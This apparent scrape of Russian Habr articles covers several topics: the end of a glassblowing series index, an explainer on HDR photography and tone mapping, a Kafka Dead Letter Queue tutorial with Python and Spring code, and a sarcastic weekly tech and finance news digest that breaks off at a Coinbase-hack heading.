2. Ё-лампа. Конспект автора.
3. Инструмент для стеклодувного дела. Конспект автора.
4. Контактная сварка для мелочей. Конспект автора.
5. Резка трубчатого стекла. Конспект автора.
6. Упрощённая откачка-наполнение ламп. Конспект автора.
7. Простая разрядная лампа с распыляемым Ti геттером. Конспект автора.
8. Освоение стекла от ЛДС типоразмера Т12. Конспект автора.
9. Лампа с сетчатым электродом. Конспект автора.
10. Несколько ламп из платинового стекла от ЛДС. Конспект автора.
11. Группы электровакуумных стёкол. Конспект автора.
12. Библиотечка электровакуумщика-любителя.

На благо всех разумных существ, Babay Mazay, май, 2025 г.

© 2025 ООО «МТ ФИНАНС»

Telegram-канал со скидками, розыгрышами призов и новостями IT 💻"
Что же такое HDR?,https://habr.com/ru/articles/909914/,"Эта сложность возникает не только у вас — HDR сбивает с толку множество людей. В этом посте мы наконец объясним, что же такое HDR, расскажем о проблеме и трёх способах её решения.
В прошлом году мы об...","Эта сложность возникает не только у вас — HDR сбивает с толку множество людей. В этом посте мы наконец объясним, что же такое HDR, расскажем о проблеме и трёх способах её решения.
В прошлом году мы объявили о добавлении в наше приложение для работы с изображениями фотографий с HDR, или «High Dynamic Range». Большинство пользователей это порадовало, кого-то сбило с толку, а некоторые проявили откровенное беспокойство. Это связано с тем, что HDR может означать два разных, хотя и близких, понятия.
Первый HDR — это «режим HDR», появившийся у камеры iPhone в 2010 году.
Сентябрь 2010 года
Второй HDR касается новых экранов, отображающих более яркие и детализированные изображения. Если вы покупали недавно телевизор, то наверняка видели подобные наклейки:
В этом посте наконец-то представлено объяснение того, что же такое HDR на самом деле, связанные с ним проблемы и три способа их решения.
Что такое динамический диапазон (Dynamic Range)?
Давайте начнём с проблемы, возникающей в реальном мире. До появления смартфонов было невозможно делать снимки закатов простыми камерами-«мыльницами». Как бы вы ни крутили настройки, всё оказывалось или слишком ярким, или слишком тёмным.
Результат съёмки заката старой камерой
На этом фото проблема связана с разными уровнями освещения неба и зданий в тени: первое испускает в тысячи раз больше света, чем вторые. Наши глаза замечательно могут воспринимать и тот, и другой уровень. Камеры же умеют работать с совокупным ярким освещением или с совокупным слабым освещением, но испытывают трудности со сценами, где есть очень тёмные и очень яркие пятна.
Под динамическим диапазоном подразумевается различие между самыми тёмными и самыми яркими частями сцены. Например, это туманное утро — пример сцены с низким динамическим диапазоном, потому что всё в ней имеет сероватый оттенок.
Большинство снимков не настолько уходит в крайности и не состоит только из ярких рассветов или туманных утренних кадров. Мы говорим, что такие сцены имеют «стандартный динамический диапазон» (standard dynamic range, SDR).
Прежде, чем двигаться дальше, стоит подчеркнуть, что проблема HDR затрагивает не только камеры. Даже если бы у нас была идеальная камера, способная полностью передавать то, что видит человек, большинство экранов не обеспечивает достаточного контраста, сопоставимого с реальным миром.
В чём бы ни заключалось «узкое место», если сцена содержит больший динамический диапазон, чем поддерживаемый камерой или экраном, мы будем терять светлые участки, тени, или и то, и другое.
Решение 1: «режим HDR»
В 1990-х исследователи разработали алгоритмы, позволявшие работать с проблемой динамических диапазонов. Сначала алгоритмы делали множество фотографий с разными настройками, чтобы зафиксировать больше ярких пятен и теней:
Вся эта серия состоит из 16 фотографий. Источник: Paul Debevec.
Затем алгоритмы объединяли всё в единое «фото», соответствовавшее человеческому зрению... бесполезное, потому что экраны компьютеров не могли отображать HDR. Поэтому эти исследователи разработали и алгоритмы для преобразования значений HDR под экран SDR. Они назвали это тональной компрессией (Tone Mapping).
Reinhard Tone Mapper, изобретённый в 2002 году. Один из многих.
Эти алгоритмы вскоре появились и в коммерческом ПО для фанатов камер.
Photomatix, приблизительно 2008 год
К сожалению, подобное ПО требовало кучи настроек, а многим фотографам в середине 2000-х, скажем так… не хватало сдержанности.
Аляповатый результат. Википедия
Даже если не учитывать вкусовщину, среднестатистическому пользователю не хочется возиться с ползунками. Большинству хочется нажать на кнопку и, особо не задумываясь, получить фотографию, похожую на то, что они видят. Поэтому Google и Apple внесли дополнительные изменения в свои приложения камер.
Камера вашего современного телефона сначала делает серию фотографий с различными уровнями яркости, как показано на снимках выше. Из этой серии фото приложение вычисляет HDR-изображение, но, в отличие от старого коммерческого ПО, оно применяет сложную логику и ИИ, чтобы выполнить тональную компрессию за пользователя.
Пол Шиллер на презентации iPhone XS рассказывает об усовершенствованном Smart HDR
Apple и Google назвали это «HDR», потому что «HDR-воссоздание с последующей автоматической тональной компрессией» звучит не так привлекательно. Но стоит уточнить, что HDR, добавленный в iPhone в 2010 году, не был HDR. Получавшийся JPEG был SDR-изображением, пытавшимся воссоздать то, что вы видите глазами. Возможно, стоило назвать его «режимом фальшивого HDR».
Знаю, это звучит немного по-педантски, но если вы считаете, что ненавидите HDR, то стоит запомнить, что настоящий виновник — это плохая тональная компрессия. Это плавно переносит нас к…
Первой негативной реакции на HDR
С течением лет Apple разрабатывала всё более качественные алгоритмы для своей камеры, в частности, Smart HDR и Deep Fusion. Из-за этого мы опасались, что наше приложение потеряет популярность. Кому нужна ручная настройка, если ИИ может справиться лучше?
Однако, к нашему удивлению, произошло обратное. Телефонные камеры становились всё умнее, а пользователи начали просить нас отключить их возможности. Примером ошибок алгоритмов может стать эта странная кайма вдоль лица моего сына Итана.
Проблемы возникали из-за того, что для работы Smart HDR и Deep Fusion требовалось сделать камерой iPhone серию снимков и объединить их, сохранив лучшие части. Иногда этот процесс даёт сбои. Но даже если алгоритмы справляются хорошо, они имеют свои минусы.
Взгляните на эти фотографии, которые я сделал на Галапагосских островах: версия ProRAW, в которой используются алгоритмы обработки серии снимков, выглядят более размазанными, чем один кадр, который я сделал за несколько секунд до этого.
Несколько объединённых снимков
Одна выдержка
Что же тут, скорее всего, происходит? Когда элементы кадра перемещаются в процессе съёмки серии фотографий (а это неизбежно происходит при фотографировании с рук), этим алгоритмам приходится слегка сдвигать пиксели, чтобы выровнять кадры. Из-за этого приходится жертвовать детализацией.
Но что, если я скажу вам, что нам не нужно идти на такие компромиссы? Аналоговым фотографам удавалось каким-то образом снимать HDR ещё в 1857 году!
«The Great Wave» Густава Ле Грея, The Met
Энсел Адамс, один из самых уважаемых фотографов 20-го века, был мастером съёмки драматичных сцен с высокими динамическими диапазонами.
The Tetons and the Snake River, Википедия
Ещё больше поражает то, что всё это он делал на бумаге, обладающей ещё меньшим динамическим диапазоном, чем экраны компьютеров!
Изучив эти аналоговые методики, мы придумали однокадровый процесс для работы с HDR.
Как нам удалось сделать это за один кадр? Чтобы ответить на этот вопрос, нужно вернуться назад во времени.
Учимся у аналога
В эпоху негативов фотография была трёхэтапным процессом.
Съёмка сцены на плёнку
Проявка плёнки в лаборатории
Перенос плёнки на бумагу
Эти этапы важно проанализировать, потому что (вот неожиданный поворот!) плёнка — это носитель с высоким динамическим диапазоном. Мы теряем динамический диапазон только при переносе фотографии с негатива на бумагу. Поэтому во времена до появления Photoshop фотографы-умельцы методикой «dodge and burn» сохраняли детали при переносе.
Фрагмент из The Print, Ansel Adams Photography Series 3
«Clearing Winter Storm, Yosemite National Park», Википедия.  
Будет ли искажением фотографии «dodge and burn»? Согласно The Print Энсела Адамса:
Если вы создаёте снимок, то не только создаёте, но и воссоздаёте. Готовое полученное изображение, по словам Альфреда Штиглица, раскрывает то, что вы увидели и почувствовали.
Я склонен с этим согласиться. Не думаю, что люди отвергнут обработку фотографий, будь то «dodge and burn» или настройка алгоритмов со множественными выдержками. Проблема в том, что алгоритмы — это не художники.
ИИ не может читать ваши мысли, поэтому никогда не учтёт ваши устремления. Например, на этом снимке мне хотелось резкого контраста между светом и тенью. ИИ решил, что сделает мне одолжение, утянув все детали в тень, сделав при этом изображение плоским.
Одинаковое освещение, почти один и тот же момент. Наверху: наше приложение. Внизу: автоматическая тональная компрессия камеры iPhone.
Даже когда тональная компрессия может помочь фото, ИИ способен зайти слишком далеко, создавая гиперреалистичные изображения с эффектом «зловещей долины». Машины не могут анализировать ваше видение и не имеют хорошего вкуса.
Мы считаем, что можно использовать другой подход.
Другой подход: однокадровая тональная компрессия
Проведя длительные исследования и эксперименты, мы создали алгоритм тональной компрессии, схожий с «dodge and burn» аналоговой фотографии. В чём его уникальность? Во-первых, он обрабатывает единственный кадр, а не использует решение с множественной экспозицией, при которой теряются детали. Хотя один снимок не может достичь динамического диапазона человеческого зрения, динамический диапазон хороших датчиков камер приближается к диапазону плёнки.
Наш алгоритм не просто заключается в том, чтобы поместить фотографию в редактор и перетаскивать ползунки «тени» и «яркие участки». Он старается максимально сохранить локальную контрастность.
В нашем редакторе есть ползунок выдержки для настройки общей яркости. Но справа есть и единая настройка, уменьшающая или увеличивающая динамический диапазон. Мы считаем. что только фотограф может решать, что ему подходит больше.
Сверху и посередине: кадр с единой настройкой выдержки. Внизу: версия с тональной компрессией.
Решение 2: настоящие HDR-дисплеи
Я так подробно объяснял разницу между HDR и тональной компрессией, потому что... барабанная дробь... современные экраны имеют HIGHer DYNAMIC RANGE!
Признаю, что лучшие современные экраны всё равно не могут сравниться с динамическим диапазоном в реальной жизни, но они всё равно намного лучше, чем в прошлом. Посмотрите несколько минут завораживающие скринсейверы Apple TV в HDR, и вы поймёте, почему этот переход ощущается столь же значимым, как переход с аналогового телевидения на HDTV. Но почему спустя девять лет после появления HDR-экранов мир всё ещё не перешёл на них?
Серьёзная проблема заключается в том, что для апгрейда инфраструктуры телевидения, кинематографа и фотографии требуются миллиарды долларов (и куча времени). Для сравнения скажу, что для достижения критической массы HDTV потребовалось больше десятка лет.
Ещё одна проблема заключается во вкусе. Как и в случае со специями, которые не должны перебивать вкус блюда, мы не хотим, чтобы HDR забивал всё. Из-за пестроты плохого HDR многие авторы фильмов испытывают смешанные чувства к этой технологии. Совсем недавно кинооператор Стив Йедлин опубликовал двухчасовую лекцию о недостатках HDR в реальном мире.
Если вы хотите увидеть, насколько плохи могут быть HDR-дисплеи, взгляните на авторов онлайн-контента. Когда-то эти жадные инфлюэнсеры поняли, что если сделать видео дискомфортно яркими, люди будут приостанавливаться при просмотре ленты Instagram. Из-за такого злонамеренного использования яркости некоторые люди полностью отключают HDR.
Я считаю, что исходя из всех этих причин, HDR может оказаться ещё одной тупиковой технологией из 2010-х, наподобие с 3D-телевизорами. Однако Apple оказалась лучшим «продажником» HDR, ведь iPhone уже многие годы снимают и отображают HDR.
Вопросы совместимости
Сделав потрясающее HDR-фото, вы, вероятно, задаётесь вопросом, где его сегодня можно посмотреть. Хорошая новость для вас заключается в том. что HDR поддерживают все iPhone, выпускаемые уже в течение долгого времени. Просто он не всегда доступен.
Как мы говорили выше, некоторые пользователи отключают HDR, потому что он их слепит, но даже когда он включен, он включен не всегда. Так как HDR потребляет больше энергии, iOS отключает его в режиме низкого энергопотребления. Кроме того, он отключается при использовании телефона на ярком солнечном свете, чтобы можно было максимально расширить яркость SDR.
Ещё большая проблема заключается в том, где выложить фото онлайн. К сожалению, большинство браузеров не может обрабатывать HDR-фотографии. Даже если вы закодируете HDR в JPEG, браузер может исказить фотографию или снизив контрастность, или сделав всё визуально плоским, или урезав яркие области, превратив снимок в аналог уродливых кадров плохих цифровых камер из 1990-х.
Но как же мне удалось показать эти примеры HDR? На самом деле, это короткие HDR-видео. Чтобы обойти ограничения браузеров, приходится идти на подобные дурацкие хаки.
До недавнего времени лучшим способом просмотра HDR было нативное приложение Instagram для iPhone. Хоть Instagram — это самое популярное место для показа фотографий... это всё-таки Instagram. К счастью, ситуация меняется.
В iOS 18 начали применять подход к HDR компании Adobe, который Apple назвала «Adaptive HDR». В этой системе фотографии хранят в одном файле информацию и SDR, и HDR. Если приложение не знает, что делать с информацией HDR, или не умеет рендерить HDR, то откатывается к SDR. Это работает и с JPEG!
Из презентации Adaptive HDR Apple
Поддержка браузерами уже на подходе. Google нанесла удар Apple своей собственной версией Adaptive HDR, которую назвала Ultra HDR; её поддерживает теперь Android 14. Разработчики Safari добавили поддержку HDR в свой developer preview, а затем отключили её из-за багов в iOS.
Кстати, о багах в iOS: HDR-фотографии иногда неправильно рендерятся и в собственном приложении Photos компании Apple! При этом странно, что они отлично рендерятся в Instagram и в других сторонних приложениях. Мы отправили Apple отчёт о баге, но из-за специфики процесса выпуска ПО Apple вряд ли увидим исправление раньше iOS 19.
Решение 3: использовать SDR
Как говорилось выше, некоторые пользователи предпочитают SDR, и это вполне нормально. Думаю, это больше связано с эстетикой lo-fi и затрагивает парадоксальность фотографии. Иногда менее реалистичное фото привлекательнее.
Но разве фотографии не должны отражать реальность? Если бы это было так, все бы пользовались пинхол-камерами, обеспечивающими съёмку всего в резком фокусе. Если бы фотография была про реализм, никто бы не снимал на чёрно-белую плёнку.
Снято на Ilford HP5, ƒ/1.4
Возьмём для примера HDR-фотографию моего отца.
Снято в ProRAW
HDR проявляет все морщины и поры кожи на его лице, а яркие участки белого на его бороде привлекают слишком много внимания. Аналогично тому, как можно использовать неглубокий фокус на предмете, в этой ситуации менее динамический диапазон кажется лучше гиперреализма. Рассмотрим версию с отключенным HDR.
Снимок без тональной компрессии
Мы считаем, что динамический диапазон — очень важный фактор для передачи красоты аналоговой фотографии в цифровую эпоху.
Снято на плёнку
Мы считаем, что тональная компрессия — бесценный инструмент, возникший сотни лет назад. Мы думаем, что HDR-дисплеи обладают потрясающим потенциалом для создания невиданных ранее изображений. Мы предвидим будущее, в котором SDR и HDR сосуществуют бок о бок. У автора должен быть выбор, использовать ли тональную компрессию, HDR или любое их сочетание. Это художественный выбор, а художник не обязан быть алгоритмом.
Мы думаем, что будущее закатов будет ярким."
DLQ-first: учим Kafka-консьюмера падать красиво и поднимать поток за секунды,https://habr.com/ru/companies/otus/articles/905810/,"Привет, Хабр!
Сегодня рассмотрим, как построить Kafka‑консьюмер, который не падёт при первой же проблеме, а аккуратно сложит битые события в Dead Letter Queue (DLQ).
Когда и зачем нужен DLQ
В Kafka жи...","Привет, Хабр!
Сегодня рассмотрим, как построить Kafka‑консьюмер, который не падёт при первой же проблеме, а аккуратно сложит битые события в Dead Letter Queue (DLQ).
Когда и зачем нужен DLQ
В Kafka жизненно важно различать две плоскости:
Плоскость
Что происходит без DLQ
Что хотим видеть
Обработка
Консьюмер читает сообщение, попытка deserialise → enrich → persist; при эксепшене offset не коммитится, поток стопорится.
Консьюмер коммитит оффсет, а проблемное событие перекидывает в DLQ‑топик.
Хранение
Сообщение остаётся в основном топике и будет «досаждать» ретраями до конца ретеншена.
Чётко знаем: «в DLQ лежат только фэйлы, прод стрим идёт дальше».
Типовые сценарии
Ситуация
Повторяемая?
Действие
Не‑валидный JSON / Avro‑схема
Fatal
Сразу в DLQ, смысла ретраить нет.
Временная недоступность БД
Retryable
DLQ с отложенным re‑consume после таймаута.
Новая версия схемы (schema registry lag)
Retryable
Либо автоматический retry, либо DLQ → пересчитай позже.
Confluent и ряд энтузиастов приводят такую практику: разделяйте ошибки на fatal и retryable, метите их в header (error.class, error.stacktrace, retryable=true/false).
Где теряются сообщения, если DLQ нет?
Консьюмер зависает на ядовитом сообщении, оффсеты не коммитятся, всё после него не читается.
DevOps убивает pod — Kubernetes рестартует, — ситуация повторяется.
Через N часов приходит ваш SRE и задаёт вопрос: «Почему в топике lag 50 млн, а бизнес‑процесс мёртв?»
Реализация DLQ на примере Kafka Consumer
Python (confluent-kafka)
from confluent_kafka import Consumer, Producer, KafkaException
import json, logging, time

# Базовый конфиг
common = {
    ""bootstrap.servers"": ""kafka-prod:9092"",
    ""group.id"":          ""enricher-v1"",
    ""auto.offset.reset"": ""earliest"",
    ""enable.auto.commit"": False,
}

consumer = Consumer(common | {""key.deserializer"": str})
producer = Producer({""bootstrap.servers"": common[""bootstrap.servers""]})

SOURCE_TOPIC = ""clicks.raw""
DLQ_TOPIC    = f""{SOURCE_TOPIC}.dlq""

def push_dlq(msg, exc, retryable: bool):
    """"""Проксируем оригинальное сообщение в DLQ c расширенными headers.""""""
    headers = msg.headers() or []
    headers.extend([
        (""error.class"", str(type(exc)).encode()),
        (""error.message"", str(exc).encode()),
        (""retryable"", b""1"" if retryable else b""0""),
        (""ts.failed"", str(int(time.time() * 1000)).encode()),
    ])
    producer.produce(
        topic=DLQ_TOPIC,
        key=msg.key(),
        value=msg.value(),
        headers=headers,
    )
    producer.flush(1_000)

def handle(msg):
    payload = json.loads(msg.value())           # может кинуть JSONDecodeError
    enriched = call_some_db(payload[""user_id""]) # может кинуть DBError
    publish_downstream(enriched)

while True:
    batch = consumer.consume(num_messages=500, timeout=1.0)
    for m in batch:
        try:
            handle(m)
            consumer.commit(m)  # ручной коммит ⇒ at-least-once
        except json.JSONDecodeError as je:
            logging.exception(""Bad JSON"")
            push_dlq(m, je, retryable=False)
            consumer.commit(m)
        except TransientDBError as te:
            logging.warning(""DB temp issue → DLQ for later retry"")
            push_dlq(m, te, retryable=True)
            consumer.commit(m)
        except Exception as e:
            # last-line defense
            push_dlq(m, e, retryable=False)
            consumer.commit(m)
Коммит оффсета после пуша в DLQ — иначе мы бы «застряли» на плохом событии. retryable header — пригодится автоматическму ретраю. producer.flush() — в проде заменяем на асинхронный delivery callback + back‑pressure.
Java (Spring Kafka ≥ 2.8)
У Spring всё из коробки благодаря DefaultErrorHandler и DeadLetterPublishingRecoverer:
@Bean
public ConcurrentKafkaListenerContainerFactory<String, OrderEvt> kafkaFactory(
        ConsumerFactory<String, OrderEvt> cf,
        KafkaOperations<String, OrderEvt> dlqTemplate) {

    var recoverer = new DeadLetterPublishingRecoverer(
        dlqTemplate,
        (rec, ex) -> new TopicPartition(rec.topic() + "".dlq"", rec.partition())
    );

    var errorHandler = new DefaultErrorHandler(
        recoverer,
        new FixedBackOff(0L, 0) // сразу в DLQ, без ретраев
    );

    errorHandler.addNotRetryableExceptions(JsonParseException.class);
    errorHandler.addRetryableExceptions(SQLException.class);

    var factory = new ConcurrentKafkaListenerContainerFactory<String, OrderEvt>();
    factory.setConsumerFactory(cf);
    factory.setCommonErrorHandler(errorHandler);
    return factory;
}

@KafkaListener(topics = ""orders.raw"", groupId = ""enricher-v1"")
public void onEvent(OrderEvt evt) {
    // enrich & persist
}
DeadLetterPublishingRecoverer автоматически копирует key/value и доклеивает метадату (kafka_dlt-original-topic, kafka_dlt-exception-fqcn, & др.). Для временных сбоев можно поставить FixedBackOff(1000L, 3) — три локальных ретрая до DLQ.
Spring‑team подтянула эти фичи с Apache Kafka 2.8; до этого приходилось писать кастомные SeekToCurrentErrorHandler.
Как мониторить и обрабатывать DLQ
Метрики и алёрты
Что смотрим
Где берём
Порог
records.in для *.dlq
kafka.server.BrokerTopicMetrics.MessagesInPerSec
>10% от основного топика (5-мин. окно)
Lag основного consumer‑group
kafka.consumer:type=consumer-fetch-manager-metrics → records-lag-max
рост экспоненциальный
Кол‑во retryable=true в DLQ
ksqlDB / Kafka Streams window count
>1000 за 15 м
Пример алерт‑правила в Prometheus:
- alert: HighDLQInRate
  expr: rate(kafka_server_brokertopicmetrics_messages_in_total{topic=~"".*\\.dlq""}[5m]) > 100
  for: 2m
  labels:
    severity: critical
  annotations:
    summary: ""DLQ inflow is {{ $value }} msg/s""
    description: ""Too many errors hitting DLQ topics""
UI для ручного ревью
kcat (kafkacat) — быстрый просмотр одного сообщения:
kcat -C -t clicks.raw.dlq -o -5 -q
AKHQ / Redpanda Console / Confluent UI — визуальный поиск по key/headers. Когда сообщений десятки тысяч, делают «DLQ‑WorkBench»: удобное SPA, где можно фильтровать по error.class, делать bulk‑reprocess.
Автоматический retry-pipeline
Архитектурный паттерн таков:
clicks.raw.dlq (-- only retryable -->) clicks.retry
         |                                   |
         | DLQ-retry-consumer                | primary-consumer
         +---------->  clicks.raw -----------+
Retry‑consumer читает только retryable=true. Ставит задержку (например, sleep(300_000) или Scheduled Executor). Пушит обратно в исходный топик с новым header x-retry-count. При превышении MAX_RETRY отправляет в clicks.raw.dlq.permanent — это уже зона ручного разбора.
В 2024-м Confluent добавила готовый компонент — Parallel Consumer с built‑in retry — но он пока в tech‑preview.
Итог
DLQ — это не просто «корзинка для битых сообщений», а фундамент отказоустойчивой стриминговой архитектуры:
Коммит оффсета → живой консьюмер.
Разметка ошибок → осмысленные ретраи.
Метрики → SRE спит спокойно.
Собрали? Тестируем — швыряем кривой JSON и дропаем коннект к БД. Консьюмер улыбается, а в DLQ аккуратно появляется две записи: одна retryable=false, вторая retryable=true. Красота.
В заключение приглашаем на открытый урок 22 мая «Оптимизация Nginx и Angie под высокие нагрузки». Узнайте, как настроить ключевые параметры для стабильной работы серверов при большом трафике, оптимизировать TLS, кэширование и анализировать производительность. Меньше узких мест — больше скорости. Записывайтесь по ссылке.
Любое развитие начинается с честной оценки. Пройдите тест на знание инфраструктуры высоконагруженных систем — он подскажет, куда расти дальше."
"Илон Маск опять идеологизирует ИИ Грока, а также запрет мемного Пепе-лягушонка в РФ",https://habr.com/ru/articles/910270/,"Самые интересные новости финансов и технологий в России и мире за неделю: Китай и США договорились по тарифам, Трамп удешевляет лекарства, улитки помогают уклоняться от налогов в UK, ребрендинг Google...","Самые интересные новости финансов и технологий в России и мире за неделю: Китай и США договорились по тарифам, Трамп удешевляет лекарства, улитки помогают уклоняться от налогов в UK, ребрендинг Google и Amazon, Маск показал танцующего робота, а также взлом Coinbase.
Торговое перемирие в торговой войне
🐌 Китай и США договорились о взаимном снижении тарифов на 90 дней: пошлины Пекина на американские товары составят 10%, а пошлины Вашингтона на китайские – 30%. Сам Трамп при этом говорит о 10%, но там еще есть какая-то хитрая надбавка сверху в 20% «за фентанил» – возможно, ее кулуарно договорились убрать попозже, когда Китай демонстративно сделает что-нибудь «анти-фентанильное», чтобы деду было чем похвастаться перед избирателями.
🐌 Но «торговое потепление» коснулось отнюдь не всех сфер: в США конгрессмен-республиканец предложил внедрить систему геотрекинга в мощные видеокарты, чтобы они не попадали в Китай. Законопроект еще не принят, но если его примут, то у производителей вроде NVIDIA, AMD и Intel будет 6 месяцев на то, чтобы вставить киберслежку в свои чипы.
🐌 В целом есть повод озаботиться этим вопросом, ведь в рамках своего ближневосточного турне Трамп договорился поставить Саудовской Аравии и ОАЭ сотни тысяч ИИ-чипов от NVIDIA и AMD – поди, если за ними не приглядывать, арабы просто накрутят ценник в два раза и перепродадут их китайцам.
🐌 А еще администрация президента США угрожает штрафами компаниям, которые планируют закупать чипы от Huawei в любой стране мира. То есть, мало того, что Америка не дает Китаю закупать чужие передовые чипы – дак она еще и пытается задавить в зародыше их собственную чиповую индустрию! Дерзковато, так-то…
Глобальная битва за AI-лидерство, такие дела
Статистика недели: S&P 500 в плюсе с начала года
🐌 Как бы то ни было, рынки вдохновились результатами торговых переговоров Китая и США, и с начала года к текущему моменту доходность S&P500 уже составила +1,7%. Возможно, и новый all-time high уже не за горами тоже!
Новости США: Трамп обещает Make Tabletki Great Again
🐌 11 мая Трамп написал, что он вот-вот поделится своей самой важной ПРАВДОЙ (ну типа – «твитом» в его соцсетке Truth Social) всех времен и народов. Все затаили дыхание.
В итоге выяснилось, что речь идет вот о чем: Трамп подписал указ, который призван снизить цены на лекарства в США. Дескать, лекарства в США стоят больше, чем в остальном мире – и теперь производителям придется уравнять цены. Получается, повысить их в остальном мире, а в Америке снизить на 30–80%. Механизм определения цен за тридцать дней должен разработать Минздрав.
🐌 Moody’s понизило кредитный рейтинг США с наивысшего ААА до АА1. Это последнее из трех крупных рейтинговых агентств, которое наконец дозрело до этого решения – а первыми были парни из S&P, которые поняли, к чему дело идет, еще аж в 2011 году. Так что, на решение экономистов-мудистов к этому моменту, в целом, уже всем как-то наплевать, если честно…
🐌 Ну и сразу к слову: цена кредитно-дефолтных свопов на американский госдолг (грубо говоря, страховки от дефолта) достигла самого высокого уровня с 2023 года – сейчас она составляет аж 0,5% на один год. Что-то, как будто бы, немного многовато для так называемого «безрискового актива». 🤔
Впрочем, как видно из картинки – не первый раз уже такое случается
Российский рынок: Требования к возвращенцам и рублификация облигаций
🐌 Российский союз промышленников и предпринимателей представил разработанный по поручению президента РФ перечень требований к иностранным компаниям, которые хотят вернуться в Россию. Среди них: у российских резидентов должен остаться контрольный (более 50%) или блокирующий (более 25%) акций, компании должны будут предоставить планы инвестиционной активности в России сроком минимум на пять лет, а также взять на себя временные ограничения на продажу активов, полученных обратно по опциону. Сейчас правительство должно эти предложения осмыслить и принять по ним какое-то решение.
🐌 Банк ВТБ запускает процедуру рублификации сразу восьми выпусков своих валютных субординированных облигаций. Это как если бы у вас кореш занял штуку баксов, когда курс был 130 рублей, а через пару лет пришел с предложением «слушай, сейчас курс упал до 80 руб./$ – давай, когда я тебе буду отдавать долг через 20 лет, я тебе типа в рублях по вот этому курсу 80 всё верну?» 👉👈
В качестве следующего шага предлагаю руководству ВТБ конвертировать свои облигации в обеспеченные цифровыми джпг-рублями
Впрочем, чтобы эта показательная рублификация произошла – нужно, чтобы за нее проголосовали свыше 75% держателей объема соответствующих выпусков. Я уж не знаю, как они там этого добиваться будут. Ну, они там плавающий купон обещают «ключевая ставка + 5%» – может, кто-то польстится на текущие 26% годовых…
Бешеный принтер и его последствия: Пепе под запретом
🐌 Принят во втором и третьем чтениях закон о локализации такси: с марта 2026 года развозить пассажиров в России можно будет только на машинах, в достаточной степени «произведенных в РФ» – Лады, Москвичи, вот это всё.
🐌 Госдума одобрила в первом чтении законопроект, по которому уехавших россиян смогут заочно привлекать к административной ответственности, если они там забугорно совершили любое правонарушение «против интересов РФ» – а также арестовывать их имущество для оплаты соответствующих штрафов. Конкретный список статей из закона специально убрали – так что, при должной фантазии суд сможет решить, что совершенно любое нарушение именно таким «противоинтереснороссийским» и является. Короче, ждем 2-е и 3-е чтение, буду вас информировать.
🐌 Россиянина оштрафовали на полторы тысячи рублей за мем с лягушонком Пепе в радужном парике – суд признал, что картинка демонстрирует символику «экстремистского сообщества ЛГБТ». У него же нашли изображение с Кларой Цеткин и Розой Люксембург на фоне радужного флага. Как водится, картинки были сохранены в альбоме ВК, причем еще в 2020 году, до признания «движения ЛГБТ» экстремистским.
Зовите меня конспирологом, но я уверен, что тут не обошлось без цепких лап Жаб Жабыча, который таким образом устраняет конкурента на мемной поляне…
Зацензурировали для вас на всякий случай срамное изображение – чтобы вы, глядя на него, не экстримизировались ненароком
Финансовая дичь недели: Улиточное налогообложение
🐌 The Times пишет про лазейку в налоговых законах Великобритании, которой начали активно пользоваться владельцы офисов. По тамошнему законодательству, собственники освобождаются от налога на недвижимость, если она используется для сельского хозяйства. Поэтому владельцы пустующих офисов начали оставлять в своих помещениях по несколько коробок с улитками – и всё, теперь официально это «улиточная ферма»! Местные власти в шоке от такой схемы: говорят, из-за нее они уже недополучили в бюджет £280,000 налогов.
Дамы и господа, представляю вам селькохозяйственно-улиточную ферму в даунтауне Лондона
🐌 Bloomberg написал про стартап Basic Capital (могу перевести исключительно как ООО «Базированный капитал»). Его идея в том, чтобы увеличить доходность пенсионных накоплений американцев с помощью плеча: вкладываешь $1 своих денег и получаешь еще $4 в виде займа под 6,3% годовых. Правда, вкладываться разрешают в основном во всякие облигации/private credit – по большей части «мусорноватые», чтобы у них доходность еще выше была, лол.
Вижу примерно так момент выхода на пенсию счастливого вкладчика «Базированного капитала» – 40 лет и 3 маржин-колла спустя
Ребрендинги недели
🐌 На этой неделе аж две крупнейшие мировые компании провели ребрендинги. Amazon впервые с 1994 года поменял свой логотип, сделав цвет стрелки-улыбки более насыщенным, а также разработав единый стиль для всех своих продуктов.
TheyReTheSamePicture.jpg
🐌 Google также поменяли свой логотип впервые за десять лет, сделав его градиентным в стиле символики своей нейросети Gemini. Пока что изменения видны только на иконке приложения «Google» на Андроиде и iOS.
я ОЧЕНЬ надеюсь, что Роскомнадзор не заблокирует статью по статье «экстремизм» из-за этой картинки…
OpenAI: Кодекс вайбкодера
🐌 OpenAI выпустила ИИ-агента для программирования Codex. Он работает на базе модели codex-1 – версии o3, оптимизированной для разработки. По словам OpenAI, модель пишет более чистый код и проверяет его, пока он не заработает. Пока что доступ есть только у подписчиков Pro, Enterprise и Team.
🐌 Мутки Microsoft и OpenAI продолжаются: FT пишет о том, как они пытаются обговорить детали разрыва отношений перед будущим IPO компании и реорганизации в корпорацию общего блага – если договориться не получится, OpenAI не сможет собирать инвестиции (в том числе и недавний раунд в $40 млрд провести не получится). Контракт с Microsoft длится до 2030 года, и Майки хотят продолжать иметь доступ к технологиям и ИИ-продуктам по окончанию этого срока, и в обмен на это они готовы частично отказаться от своей доли в будущей структуре OpenAI.
xAI: Маск опять лезет в мозг Grok
🐌 Маск опять промывает мозг своему AI-Гроку: на этот раз по поводу белых беженцев-буров из Южной Африки. 14 мая Грок внезапно стал вставлять в огромное количество своих ответов обсуждение именно этого вопроса – независимо от того, имеет ли это вообще какое-либо отношение к тому, о чем его спрашивали.
Буквально, «а я вам сейчас покажу, откуда на белых буров готовилось нападение...» 
Похожий инцидент уже случался в феврале (подробнее писал в этом Твиттер-треде), когда Гроку принудительно запретили называть Маска и Трампа «главными лжецами в интернете» – тогда всё свалили на «недавно нанятого чувака из OpenAI, который не успел проникнуться ценностями xAI». Вы будете смеяться, но и в этот раз опять отмаз точно такой же – снова такой же «непроникнувшийся» команде разработчиков xAI в штаны насрал! В итоге изменения быстро откатили, и в xAI пообещали отныне публиковать все системные промпты в открытом доступе (ну, тут действительно похвалить можно). Подробнее читайте у Цви вот здесь.
🐌 Но есть и хорошие новости: Илон Маск выложил в Твиттере видео с танцующим роботом Оптимусом. Кринжовые танцы чувака в белом спандексе с презентации Теслабота в 2021 году наконец-то воплотились в реальность!
Крипта: Coinbase взломали
